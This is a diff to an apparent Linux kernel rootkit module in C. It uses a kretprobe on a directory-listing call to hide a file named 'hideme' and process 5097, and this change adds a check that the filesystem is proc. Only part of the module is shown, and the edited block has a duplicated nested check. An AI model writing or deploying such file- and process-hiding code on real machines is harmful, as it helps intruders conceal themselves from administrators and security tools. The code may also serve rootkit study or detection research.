@@ -9,12 +9,11 @@
 #include <linux/dirent.h>
 #include <linux/string.h>
 #include <linux/fdtable.h>
-#include <linux/fdtable.h>
 
 /// const file name to hide
 const char* hide_file_name = "hideme";
 const char* hide_pid = "5097";
-const char* hide_pid_path = "/proc/5097/fd";
+const char* hide_pid_path = "/5097/fd";
 
 typedef bool (*entry_filter_t)(struct linux_dirent64*);
 
@@ -74,22 +73,21 @@ static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 
     // filter socket
     char fd_path[256];
-    char mount_path[256];
+
     struct file* file = files_lookup_fd_raw(current->files, args->fd);
     struct dentry* dentry = file->f_path.dentry;
     char* path = dentry_path_raw(dentry, fd_path, 256);
 
-    struct dentry* mnt = file->f_path.mnt->mnt_root;
-    char* mnt_path = dentry_path_raw(mnt, mount_path, 256);
+    struct super_block* sb= file->f_path.mnt->mnt_sb;
 
     if(strcmp(path, hide_pid_path) == 0){
         pr_info("found usage in path=%s\n", path);
+    // checking if the vfs is proc
+    if(strcmp(sb->s_id, "proc") == 0){
+        if(strcmp(path, hide_pid_path) == 0){
+            pr_info("found usage in path=%s\n", path);
+        }
     }
-    if(retval == 144){
-        pr_info("path=%s, mnt=%s\n", path, mnt_path);
-    }
-
-
 
     return 0;
 }
